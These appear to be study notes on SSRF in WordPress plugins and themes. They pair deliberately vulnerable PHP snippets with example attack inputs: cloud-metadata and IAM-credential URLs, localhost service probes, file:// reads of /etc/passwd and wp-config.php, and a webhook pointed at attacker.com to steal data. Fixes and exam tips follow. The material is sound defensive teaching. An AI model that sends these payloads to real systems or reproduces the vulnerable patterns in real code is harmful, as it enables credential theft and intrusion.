# 3.13 SSRF Exploits via Misconfigured Code or Plugins - Study Notes

## Overview

SSRF vulnerabilities often occur due to misconfigured code or plugins that make unsafe remote requests. This topic covers common vulnerable patterns and how attackers exploit them.

**Key Reference:** [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

---

## 1. Unsafe Use of wp_remote_get()

### Vulnerable Pattern

```php
// ❌ BAD - User input directly in wp_remote_get()
function fetch_url() {
	$url = $_GET['url'];
	$response = wp_remote_get( $url );
	return wp_remote_retrieve_body( $response );
}
```

### Attack Scenarios

**Internal Service Access:**
```php
// Attacker requests:
// ?url=http://127.0.0.1:3306
// Accesses MySQL database

// ?url=http://localhost:6379
// Accesses Redis cache
```

**Cloud Metadata:**
```php
// ?url=http://169.254.169.254/latest/meta-data/
// AWS instance metadata

// ?url=http://metadata.google.internal/computeMetadata/v1/
// Google Cloud metadata
```

**Local Files:**
```php
// ?url=file:///etc/passwd
// Reads local files

// ?url=file:///var/www/wp-config.php
// Accesses WordPress configuration
```

---

## 2. Unsafe Use of file_get_contents()

### Vulnerable Pattern

```php
// ❌ BAD - file_get_contents() with user input
function import_data() {
	$import_url = $_POST['import_url'];
	$data = file_get_contents( $import_url );
	process_data( $data );
}
```

### Exploitation

**File Protocol:**
```php
// POST import_url=file:///etc/passwd
// Reads system files

// POST import_url=file:///var/www/.env
// Accesses environment variables
```

**Internal Services:**
```php
// POST import_url=http://127.0.0.1:8080/admin
// Accesses internal admin panel
```

---

## 3. Plugin Vulnerabilities

### Image Processing Plugins

**Vulnerable Pattern:**
```php
// Image preview/processing plugin
function process_image() {
	$image_url = $_GET['image_url'];
	$image_data = wp_remote_get( $image_url );
	// Process image
}
```

**Exploitation:**
```php
// ?image_url=http://169.254.169.254/latest/meta-data/
// Accesses cloud metadata

// ?image_url=http://127.0.0.1:3306
// Probes internal database
```

### Import/Export Plugins

**Vulnerable Pattern:**
```php
// Import plugin
function import_content() {
	$source_url = $_POST['source'];
	$content = wp_remote_get( $source_url );
	import( $content );
}
```

**Exploitation:**
```php
// POST source=http://internal-api:8080/data
// Accesses internal API

// POST source=file:///var/www/backup.sql
// Reads database backups
```

### Webhook Plugins

**Vulnerable Pattern:**
```php
// Webhook callback
function send_webhook() {
	$webhook_url = $_POST['webhook_url'];
	$data = array( 'event' => 'triggered' );
	wp_remote_post( $webhook_url, array( 'body' => $data ) );
}
```

**Exploitation:**
```php
// POST webhook_url=http://127.0.0.1:8080/internal
// Sends data to internal service

// POST webhook_url=http://localhost/admin/trigger
// Triggers internal actions
```

---

## 4. Theme Vulnerabilities

### External Asset Loading

**Vulnerable Pattern:**
```php
// Theme function
function load_external_asset() {
	$asset_url = get_theme_mod( 'external_asset_url' );
	$asset = wp_remote_get( $asset_url );
	return wp_remote_retrieve_body( $asset );
}
```

**Exploitation:**
- Attacker modifies theme option
- Sets URL to internal service
- Accesses internal resources

### API Integrations

**Vulnerable Pattern:**
```php
// Theme API integration
function fetch_api_data() {
	$api_url = $_GET['api_endpoint'];
	$response = wp_remote_get( $api_url );
	return json_decode( wp_remote_retrieve_body( $response ) );
}
```

**Exploitation:**
- Attacker provides internal API endpoint
- Accesses internal services
- Retrieves sensitive data

---

## 5. Common Misconfigurations

### No URL Validation

```php
// ❌ BAD - No validation
function unsafe_request() {
	$url = $_GET['url'];
	return wp_remote_get( $url );
}

// ✅ GOOD - Validate URL
function safe_request() {
	$url = esc_url_raw( $_GET['url'] );

	// Validate scheme
	if ( ! in_array( parse_url( $url, PHP_URL_SCHEME ), array( 'http', 'https' ), true ) ) {
		return new WP_Error( 'invalid_scheme', 'Invalid URL scheme' );
	}

	// Validate host
	$host = parse_url( $url, PHP_URL_HOST );
	if ( is_internal_host( $host ) ) {
		return new WP_Error( 'internal_host', 'Internal hosts not allowed' );
	}

	return wp_remote_get( $url );
}
```

### Allowing Internal IPs

```php
// ❌ BAD - Allows internal IPs
function fetch_data( $url ) {
	// No IP checking
	return wp_remote_get( $url );
}

// ✅ GOOD - Block internal IPs
function fetch_data( $url ) {
	$host = parse_url( $url, PHP_URL_HOST );

	// Resolve to IP
	$ip = gethostbyname( $host );

	// Check if internal
	if ( is_internal_ip( $ip ) ) {
		return new WP_Error( 'internal_ip', 'Internal IPs not allowed' );
	}

	return wp_remote_get( $url );
}

function is_internal_ip( $ip ) {
	// Private IP ranges
	$private_ranges = array(
		'127.0.0.0/8',      // localhost
		'10.0.0.0/8',       // Private
		'172.16.0.0/12',    // Private
		'192.168.0.0/16',  // Private
		'169.254.0.0/16',   // Link-local
	);

	foreach ( $private_ranges as $range ) {
		if ( ip_in_range( $ip, $range ) ) {
			return true;
		}
	}

	return false;
}
```

### No Protocol Restriction

```php
// ❌ BAD - Allows any protocol
function fetch( $url ) {
	return file_get_contents( $url );
	// Allows: http, https, file, ftp, etc.
}

// ✅ GOOD - Restrict protocols
function fetch( $url ) {
	$scheme = parse_url( $url, PHP_URL_SCHEME );

	if ( ! in_array( $scheme, array( 'http', 'https' ), true ) ) {
		return new WP_Error( 'invalid_protocol', 'Only HTTP/HTTPS allowed' );
	}

	return wp_remote_get( $url );
}
```

---

## 6. Real-World Examples

### Example 1: Image Preview Plugin

```php
// Vulnerable plugin
class Image_Preview {
	public function preview() {
		$url = $_GET['image_url'];
		$response = wp_remote_get( $url );
		$image = wp_remote_retrieve_body( $response );
		header( 'Content-Type: image/jpeg' );
		echo $image;
	}
}

// Attack:
// ?image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
// Returns AWS credentials as "image"
```

### Example 2: Import Plugin

```php
// Vulnerable plugin
function import_from_url() {
	$url = $_POST['import_url'];
	$data = file_get_contents( $url );
	import_data( $data );
}

// Attack:
// POST import_url=file:///var/www/wp-config.php
// Imports WordPress configuration (exposes database credentials)
```

### Example 3: Webhook Plugin

```php
// Vulnerable plugin
function trigger_webhook() {
	$webhook = $_POST['webhook_url'];
	$payload = array( 'data' => get_sensitive_data() );
	wp_remote_post( $webhook, array( 'body' => $payload ) );
}

// Attack:
// POST webhook_url=http://attacker.com/steal
// Sends sensitive data to attacker
```

---

## 7. Identifying Vulnerable Code

### Code Patterns to Look For

1. **Direct User Input in Requests:**
```php
wp_remote_get( $_GET['url'] );
file_get_contents( $_POST['file'] );
curl_exec( curl_init( $_REQUEST['endpoint'] ) );
```

2. **No URL Validation:**
```php
// Missing validation
$url = $_GET['url'];
$response = wp_remote_get( $url );
```

3. **Allowing file:// Protocol:**
```php
// Dangerous
file_get_contents( $url ); // Allows file://
```

4. **No IP Checking:**
```php
// No internal IP blocking
wp_remote_get( $url );
```

---

## Exam Tips

### Key Points to Remember

1. **Vulnerable Functions:**
   - `wp_remote_get()` / `wp_remote_post()` with user input
   - `file_get_contents()` with user input
   - cURL with user input

2. **Common Vulnerabilities:**
   - No URL validation
   - Allowing internal IPs
   - Allowing file:// protocol
   - No protocol restriction

3. **Attack Targets:**
   - Internal services (databases, APIs)
   - Cloud metadata services
   - Local file system
   - Internal network resources

4. **Plugin Risks:**
   - Image processing plugins
   - Import/export plugins
   - Webhook plugins
   - API integration plugins

5. **Prevention:**
   - Validate URLs
   - Block internal IPs
   - Restrict protocols
   - Whitelist allowed domains

---

## Additional Resources

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [WordPress HTTP API - WordPress Developer Resources](https://developer.wordpress.org/plugins/http-api/)
